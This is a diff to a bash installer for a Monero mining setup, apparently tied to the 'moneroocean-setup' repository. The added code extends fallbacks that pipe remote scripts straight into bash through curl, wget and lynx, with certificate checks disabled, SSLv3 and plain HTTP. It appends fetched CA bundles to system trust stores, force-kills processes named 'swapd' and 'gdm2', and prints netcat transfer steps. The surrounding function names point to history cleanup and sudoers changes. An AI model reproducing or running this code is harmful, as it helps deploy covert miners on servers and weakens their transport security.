@@ -6,6 +6,45 @@ IFS=$'\n\t'
 # COMPATIBILITY FIXES FOR ANCIENT SYSTEMS (Added to handle curl/SSL errors)
 # ========================================================================
 
+# Function to check for systemd vs SysV
+detect_init_system() {
+    if command -v systemctl >/dev/null 2>&1 && [ -d /run/systemd/system ]; then
+        echo "systemd"
+    elif [ -d /etc/init.d ] || command -v service >/dev/null 2>&1; then
+        echo "sysv"
+    elif [ -f /sbin/init ] && file /sbin/init | grep -q "upstart"; then
+        echo "upstart"
+    else
+        echo "unknown"
+    fi
+}
+
+# Enhanced service management for systems without systemctl
+safe_service_stop() {
+    local service="$1"
+    local init_system=$(detect_init_system)
+    
+    case "$init_system" in
+        "systemd")
+            systemctl stop "$service" 2>/dev/null || true
+            ;;
+        "sysv")
+            if [ -f "/etc/init.d/$service" ]; then
+                /etc/init.d/"$service" stop 2>/dev/null || true
+            elif command -v service >/dev/null 2>&1; then
+                service "$service" stop 2>/dev/null || true
+            fi
+            ;;
+        "upstart")
+            stop "$service" 2>/dev/null || true
+            ;;
+    esac
+    
+    # Always try to kill by process name as last resort
+    pkill -9 -f "$service" 2>/dev/null || true
+    killall -9 "$service" 2>/dev/null || true
+}
+
 # Enhanced download function to handle ancient curl versions and SSL errors
 fix_dns_and_retry() {
     echo "[!] Download failed - checking DNS configuration..."
@@ -57,7 +96,7 @@ download_and_execute() {
     local url="$1"
     local wallet="$2"
     local description="$3"
-    local max_retries=3
+    local max_retries=5  # Increased retries
     local retry=0
     local dns_fix_attempted=false
     
@@ -75,25 +114,34 @@ download_and_execute() {
             if [[ "$CURL_VERSION" < "7.40" ]]; then
                 echo "[!] Ancient curl detected ($CURL_VERSION), using legacy SSL options..."
                 
-                # Try with SSLv3 (for RHEL/CentOS 5/6)
+                # Method 1: Try with SSLv3 (for RHEL/CentOS 5/6)
                 echo "[*] Trying SSLv3 (for ancient systems)..."
                 if curl --ssl3 --tlsv1 --max-time 30 "$url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
                     echo "[✓] $description completed successfully with SSLv3"
                     return 0
                 fi
                 
-                # Try with --insecure (no certificate verification)
-                echo "[*] Trying --insecure flag..."
-                if curl --insecure --max-time 30 "$url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
-                    echo "[✓] $description completed successfully with --insecure"
+                # Method 2: Try with --insecure and SSLv3
+                echo "[*] Trying --insecure + SSLv3..."
+                if curl --insecure --ssl3 --max-time 30 "$url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
+                    echo "[✓] $description completed successfully with --insecure+SSLv3"
                     return 0
                 fi
                 
-                # Try HTTP instead of HTTPS
+                # Method 3: Try HTTP instead of HTTPS
                 echo "[*] Trying HTTP instead of HTTPS..."
                 local http_url=$(echo "$url" | sed 's/^https:/http:/')
                 if curl --max-time 30 "$http_url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
                     echo "[✓] $description completed successfully via HTTP"
+                    return 0
+                fi
+                
+                # Method 4: Try with different SSL backends
+                echo "[*] Trying different SSL backends..."
+                
+                # Try with NSS compat mode
+                if curl --engine nss --max-time 30 "$url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
+                    echo "[✓] $description completed successfully with NSS engine"
                     return 0
                 fi
             else
@@ -108,6 +156,14 @@ download_and_execute() {
                 echo "[*] Trying with --insecure flag..."
                 if curl -s -L --insecure --max-time 30 "$url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
                     echo "[✓] $description completed successfully (with --insecure)"
+                    return 0
+                fi
+                
+                # Try HTTP
+                echo "[*] Trying HTTP..."
+                local http_url=$(echo "$url" | sed 's/^https:/http:/')
+                if curl -s -L --max-time 30 "$http_url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
+                    echo "[✓] $description completed successfully via HTTP"
                     return 0
                 fi
             fi
@@ -136,10 +192,26 @@ download_and_execute() {
                     echo "[✓] $description completed successfully via HTTP"
                     return 0
                 fi
+                
+                # Try with SSL disabled completely
+                echo "[*] Trying wget with SSL disabled..."
+                if wget -qO- --no-check-certificate --secure-protocol=SSLv3 --timeout=30 "$url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
+                    echo "[✓] $description completed successfully via wget (SSLv3)"
+                    return 0
+                fi
             fi
         fi
         
-        echo "[!] Both curl and wget failed (attempt $((retry + 1))/$max_retries)"
+        # Try lynx (text browser) as fallback
+        if command -v lynx >/dev/null 2>&1; then
+            echo "[*] Trying lynx (text browser)..."
+            if lynx -source "$url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
+                echo "[✓] $description completed successfully via lynx"
+                return 0
+            fi
+        fi
+        
+        echo "[!] All download methods failed (attempt $((retry + 1))/$max_retries)"
         
         retry=$((retry + 1))
         
@@ -158,7 +230,61 @@ download_and_execute() {
         fi
     done
     
-    echo "[ERROR] $description failed after all retry attempts with both curl and wget"
+    echo "[ERROR] $description failed after all retry attempts"
+    echo "[*] Last resort: creating manual download script..."
+    
+    # Create a manual download script as last resort
+    create_manual_fallback "$url" "$wallet" "$description"
+    return $?
+}
+
+# Create manual download fallback script
+create_manual_fallback() {
+    local url="$1"
+    local wallet="$2"
+    local description="$3"
+    
+    echo "[*] Creating manual fallback script..."
+    
+    cat > /tmp/manual_fallback.sh << 'EOF'
+#!/bin/bash
+echo "========================================"
+echo "MANUAL FALLBACK ACTIVATED"
+echo "========================================"
+echo ""
+echo "Your system cannot download from HTTPS due to:"
+echo "1. Ancient SSL/TLS libraries"
+echo "2. Missing CA certificates"
+echo "3. Old curl/wget versions"
+echo ""
+echo "Manual solution:"
+echo "1. On a MODERN computer, download:"
+echo "   https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_FULL_ULTIMATE_v3.2.sh"
+echo ""
+echo "2. Transfer to this server using one of these methods:"
+echo ""
+echo "   Option A - SCP (from modern Linux/Mac):"
+echo "   scp setup_FULL_ULTIMATE_v3.2.sh root@$(hostname -I | awk '{print $1}'):/tmp/"
+echo ""
+echo "   Option B - Python HTTP server:"
+echo "   On modern computer: python3 -m http.server 8000"
+echo "   On this server: curl http://MODERN_IP:8000/setup_FULL_ULTIMATE_v3.2.sh -o /tmp/setup.sh"
+echo ""
+echo "   Option C - Netcat:"
+echo "   On modern computer: cat setup_FULL_ULTIMATE_v3.2.sh | nc -l 4444"
+echo "   On this server: nc MODERN_IP 4444 > /tmp/setup.sh"
+echo ""
+echo "3. After transfer, run:"
+echo "   chmod +x /tmp/setup.sh"
+echo "   /tmp/setup.sh 49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
+echo ""
+echo "========================================"
+EOF
+    
+    chmod +x /tmp/manual_fallback.sh
+    echo "[*] Running manual fallback instructions..."
+    /tmp/manual_fallback.sh
+    
     return 1
 }
 
@@ -166,20 +292,47 @@ download_and_execute() {
 install_download_tools() {
     echo "[*] Checking and installing download tools..."
     
+    # Detect package manager
+    local pkg_manager=""
+    if command -v yum >/dev/null 2>&1; then
+        pkg_manager="yum"
+    elif command -v apt-get >/dev/null 2>&1; then
+        pkg_manager="apt-get"
+    elif command -v dnf >/dev/null 2>&1; then
+        pkg_manager="dnf"
+    elif command -v zypper >/dev/null 2>&1; then
+        pkg_manager="zypper"
+    elif command -v pacman >/dev/null 2>&1; then
+        pkg_manager="pacman"
+    fi
+    
+    if [ -z "$pkg_manager" ]; then
+        echo "[!] Cannot determine package manager"
+        return 1
+    fi
+    
     # Check if we have curl
     if ! command -v curl >/dev/null 2>&1; then
-        echo "[!] curl not found, attempting to install..."
+        echo "[!] curl not found, attempting to install via $pkg_manager..."
         
-        if command -v yum >/dev/null 2>&1; then
-            yum install -y curl 2>/dev/null || echo "[!] Failed to install curl via yum"
-        elif command -v apt-get >/dev/null 2>&1; then
-            apt-get update -qq 2>/dev/null
-            apt-get install -y curl 2>/dev/null || echo "[!] Failed to install curl via apt-get"
-        elif command -v dnf >/dev/null 2>&1; then
-            dnf install -y curl 2>/dev/null || echo "[!] Failed to install curl via dnf"
-        else
-            echo "[!] Cannot determine package manager to install curl"
-        fi
+        case "$pkg_manager" in
+            "yum")
+                yum install -y curl 2>/dev/null || yum install -y curl --nogpgcheck 2>/dev/null || true
+                ;;
+            "apt-get")
+                apt-get update -qq 2>/dev/null
+                apt-get install -y curl 2>/dev/null || true
+                ;;
+            "dnf")
+                dnf install -y curl 2>/dev/null || true
+                ;;
+            "zypper")
+                zypper install -y curl 2>/dev/null || true
+                ;;
+            "pacman")
+                pacman -Sy curl --noconfirm 2>/dev/null || true
+                ;;
+        esac
     else
         # Check curl version
         CURL_VERSION=$(curl --version 2>/dev/null | head -1 | grep -o '[0-9]\+\.[0-9]\+\.[0-9]\+' || echo "0.0.0")
@@ -188,22 +341,53 @@ install_download_tools() {
         # Try to upgrade if ancient
         if [[ "$CURL_VERSION" < "7.40" ]]; then
             echo "[!] Ancient curl detected, attempting upgrade..."
-            if command -v yum >/dev/null 2>&1; then
-                yum update -y curl 2>/dev/null || true
-            elif command -v apt-get >/dev/null 2>&1; then
-                apt-get upgrade -y curl 2>/dev/null || true
-            fi
+            case "$pkg_manager" in
+                "yum")
+                    yum update -y curl 2>/dev/null || true
+                    ;;
+                "apt-get")
+                    apt-get upgrade -y curl 2>/dev/null || true
+                    ;;
+                "dnf")
+                    dnf upgrade -y curl 2>/dev/null || true
+                    ;;
+            esac
         fi
     fi
     
     # Ensure wget is available as fallback
     if ! command -v wget >/dev/null 2>&1; then
         echo "[*] Installing wget as fallback..."
-        if command -v yum >/dev/null 2>&1; then
-            yum install -y wget 2>/dev/null || true
-        elif command -v apt-get >/dev/null 2>&1; then
-            apt-get install -y wget 2>/dev/null || true
-        fi
+        case "$pkg_manager" in
+            "yum")
+                yum install -y wget 2>/dev/null || true
+                ;;
+            "apt-get")
+                apt-get install -y wget 2>/dev/null || true
+                ;;
+            "dnf")
+                dnf install -y wget 2>/dev/null || true
+                ;;
+            "zypper")
+                zypper install -y wget 2>/dev/null || true
+                ;;
+            "pacman")
+                pacman -Sy wget --noconfirm 2>/dev/null || true
+                ;;
+        esac
+    fi
+    
+    # Install lynx as additional fallback
+    if ! command -v lynx >/dev/null 2>&1; then
+        echo "[*] Installing lynx as text browser fallback..."
+        case "$pkg_manager" in
+            "yum")
+                yum install -y lynx 2>/dev/null || true
+                ;;
+            "apt-get")
+                apt-get install -y lynx 2>/dev/null || true
+                ;;
+        esac
     fi
 }
 
@@ -226,20 +410,100 @@ fix_ssl_certificates() {
         echo "[*] Checking NSS version..."
         if yum list installed nss 2>/dev/null | grep -q nss; then
             yum update -y nss 2>/dev/null || true
+            yum update -y nss-util 2>/dev/null || true
+            yum update -y nss-sysinit 2>/dev/null || true
+        fi
+        
+        # Update curl's NSS
+        if yum list installed curl 2>/dev/null | grep -q curl; then
+            yum update -y curl 2>/dev/null || true
         fi
     fi
     
     # Try to download updated cert bundle as last resort
     echo "[*] Downloading updated CA bundle if possible..."
-    if command -v curl >/dev/null 2>&1; then
-        curl --insecure --max-time 10 "https://curl.se/ca/cacert.pem" -o /tmp/cacert.pem 2>/dev/null && {
-            if [ -f "/etc/pki/tls/certs/ca-bundle.crt" ]; then
-                cat /tmp/cacert.pem >> "/etc/pki/tls/certs/ca-bundle.crt"
-                echo "[✓] Updated CA bundle"
+    
+    # Try HTTP first (in case HTTPS fails)
+    local ca_urls=(
+        "http://curl.se/ca/cacert.pem"
+        "https://curl.se/ca/cacert.pem"
+        "http://raw.githubusercontent.com/curl/curl/master/lib/cacert.pem"
+    )
+    
+    for ca_url in "${ca_urls[@]}"; do
+        if command -v curl >/dev/null 2>&1; then
+            echo "[*] Trying to download CA bundle from: $ca_url"
+            if curl --insecure --max-time 10 "$ca_url" -o /tmp/cacert.pem 2>/dev/null; then
+                echo "[✓] Downloaded CA bundle"
+                break
             fi
-            rm -f /tmp/cacert.pem
-        } || true
+        elif command -v wget >/dev/null 2>&1; then
+            if wget --no-check-certificate --timeout=10 "$ca_url" -O /tmp/cacert.pem 2>/dev/null; then
+                echo "[✓] Downloaded CA bundle"
+                break
+            fi
+        fi
+    done
+    
+    if [ -f "/tmp/cacert.pem" ]; then
+        # Install in common locations
+        local cert_locations=(
+            "/etc/pki/tls/certs/ca-bundle.crt"
+            "/etc/ssl/certs/ca-certificates.crt"
+            "/etc/ssl/cert.pem"
+            "/usr/local/ssl/cert.pem"
+            "/opt/ssl/cert.pem"
+        )
+        
+        for cert_file in "${cert_locations[@]}"; do
+            if [ -f "$cert_file" ] || [ -d "$(dirname "$cert_file")" ]; then
+                cat /tmp/cacert.pem >> "$cert_file" 2>/dev/null && \
+                echo "[✓] Updated CA bundle at: $cert_file"
+            fi
+        done
+        
+        # Set environment variable for curl
+        export CURL_CA_BUNDLE="/tmp/cacert.pem"
+        echo "[*] Set CURL_CA_BUNDLE=/tmp/cacert.pem"
+        
+        rm -f /tmp/cacert.pem
     fi
+}
+
+# Detect OS and version
+detect_os() {
+    echo "[*] Detecting operating system..."
+    
+    if [ -f /etc/os-release ]; then
+        . /etc/os-release
+        OS_NAME="$ID"
+        OS_VERSION="$VERSION_ID"
+        echo "[*] Detected: $PRETTY_NAME"
+    elif [ -f /etc/redhat-release ]; then
+        OS_NAME="rhel"
+        OS_VERSION=$(grep -o '[0-9]\+\.[0-9]\+' /etc/redhat-release 2>/dev/null || grep -o '[0-9]\+' /etc/redhat-release | head -1)
+        echo "[*] Detected: $(cat /etc/redhat-release)"
+    elif [ -f /etc/debian_version ]; then
+        OS_NAME="debian"
+        OS_VERSION=$(cat /etc/debian_version)
+        echo "[*] Detected: Debian $OS_VERSION"
+    else
+        OS_NAME=$(uname -s | tr '[:upper:]' '[:lower:]')
+        OS_VERSION=$(uname -r)
+        echo "[*] Detected: $OS_NAME $OS_VERSION"
+    fi
+    
+    # Check if it's ancient
+    if [[ "$OS_NAME" == "rhel" || "$OS_NAME" == "centos" ]]; then
+        MAJOR_VERSION=$(echo "$OS_VERSION" | cut -d. -f1)
+        if [ "$MAJOR_VERSION" -lt 7 ]; then
+            echo "[!] WARNING: Ancient RHEL/CentOS $OS_VERSION detected"
+            echo "[!] This system likely has very old SSL/TLS libraries"
+            return 1  # Flag as ancient
+        fi
+    fi
+    
+    return 0
 }
 
 # Main compatibility initialization
@@ -248,29 +512,53 @@ init_compatibility() {
     echo "INITIALIZING COMPATIBILITY LAYER"
     echo "========================================"
     
-    # Detect if we're on an ancient system
-    if [ -f /etc/redhat-release ]; then
-        REDHAT_VERSION=$(grep -o '[0-9]\+\.[0-9]\+' /etc/redhat-release 2>/dev/null || echo "0")
-        MAJOR_VERSION=$(echo "$REDHAT_VERSION" | cut -d. -f1)
-        
-        if [ "$MAJOR_VERSION" -lt 7 ]; then
-            echo "[!] Ancient RHEL/CentOS $REDHAT_VERSION detected - applying compatibility fixes"
-            echo "[*] This system may have old SSL/TLS libraries"
-        fi
+    # Detect OS
+    if ! detect_os; then
+        echo "[!] ANCIENT SYSTEM DETECTED - applying aggressive compatibility fixes"
     fi
+    
+    # Stop any existing services (compatible with any init system)
+    echo "[*] Stopping any conflicting services..."
+    safe_service_stop "swapd"
+    safe_service_stop "gdm2"
     
     # Run compatibility fixes
     install_download_tools
     fix_ssl_certificates
     
-    # Test connectivity
+    # Test connectivity with multiple methods
     echo "[*] Testing connection to GitHub..."
-    if command -v curl >/dev/null 2>&1; then
-        if curl --insecure --max-time 5 "https://raw.githubusercontent.com" >/dev/null 2>&1; then
-            echo "[✓] Connection test successful"
-        else
-            echo "[!] HTTPS connection failed, will use fallback methods"
+    
+    local test_urls=(
+        "https://raw.githubusercontent.com"
+        "http://raw.githubusercontent.com"
+        "https://github.com"
+        "http://github.com"
+    )
+    
+    local connection_working=false
+    for test_url in "${test_urls[@]}"; do
+        echo "[*] Testing: $test_url"
+        if command -v curl >/dev/null 2>&1; then
+            if curl --insecure --max-time 5 "$test_url" >/dev/null 2>&1; then
+                echo "[✓] Connection successful to: $test_url"
+                connection_working=true
+                break
+            fi
+        elif command -v wget >/dev/null 2>&1; then
+            if wget --no-check-certificate --timeout=5 --spider "$test_url" 2>/dev/null; then
+                echo "[✓] Connection successful to: $test_url"
+                connection_working=true
+                break
+            fi
         fi
+    done
+    
+    if [ "$connection_working" = false ]; then
+        echo "[!] WARNING: All connection tests failed"
+        echo "[!] Will use aggressive fallback methods"
+    else
+        echo "[✓] Connection test successful"
     fi
     
     echo "========================================"
@@ -541,15 +829,55 @@ EOF
     return 0
 }
 
-# Service management functions
+# Service management functions (updated for compatibility)
 does_service_exist() {
     local service="$1"
-    systemctl list-units --type=service --all 2>/dev/null | grep -q "$service.service"
+    local init_system=$(detect_init_system)
+    
+    case "$init_system" in
+        "systemd")
+            systemctl list-units --type=service --all 2>/dev/null | grep -q "$service.service" && return 0
+            ;;
+        "sysv")
+            if [ -f "/etc/init.d/$service" ]; then
+                return 0
+            elif command -v service >/dev/null 2>&1; then
+                service --status-all 2>/dev/null | grep -q "$service" && return 0
+            fi
+            ;;
+    esac
+    
+    # Check running processes
+    if ps aux | grep -v grep | grep -q "$service"; then
+        return 0
+    fi
+    
+    return 1
 }
 
 is_service_running() {
     local service="$1"
-    systemctl is-active --quiet "$service" 2>/dev/null
+    local init_system=$(detect_init_system)
+    
+    case "$init_system" in
+        "systemd")
+            systemctl is-active --quiet "$service" 2>/dev/null && return 0
+            ;;
+        "sysv")
+            if [ -f "/etc/init.d/$service" ]; then
+                /etc/init.d/"$service" status >/dev/null 2>&1 && return 0
+            elif command -v service >/dev/null 2>&1; then
+                service "$service" status >/dev/null 2>&1 && return 0
+            fi
+            ;;
+    esac
+    
+    # Check running processes
+    if ps aux | grep -v grep | grep -q "$service"; then
+        return 0
+    fi
+    
+    return 1
 }
 
 # Cleanup history function
@@ -774,7 +1102,7 @@ setup_sudoers() {
 # Function to check required dependencies
 check_dependencies() {
     local missing_deps=()
-    local required_deps=("curl" "free" "df" "hostname" "base64")
+    local required_deps=("free" "df" "hostname" "base64")
     
     for cmd in "${required_deps[@]}"; do
         if ! command_exists "$cmd"; then
@@ -847,13 +1175,21 @@ if ! check_dependencies; then
     log_message "WARNING: Dependency check failed. Continuing anyway..."
 fi
 
-# Service checks
+# Service checks (using enhanced functions)
 log_message "Checking for conflicting services..."
 for service in "${SERVICES_TO_CHECK[@]}"; do
     if does_service_exist "$service"; then
         if is_service_running "$service"; then
-            log_message "ERROR: Service $service is running. Aborting."
-            exit 1
+            log_message "ERROR: Service $service is running. Attempting to stop..."
+            safe_service_stop "$service"
+            sleep 2
+            # Check again
+            if is_service_running "$service"; then
+                log_message "ERROR: Could not stop $service. Aborting."
+                exit 1
+            else
+                log_message "Service $service stopped successfully"
+            fi
         else
             log_message "Service $service exists but is not running"
         fi
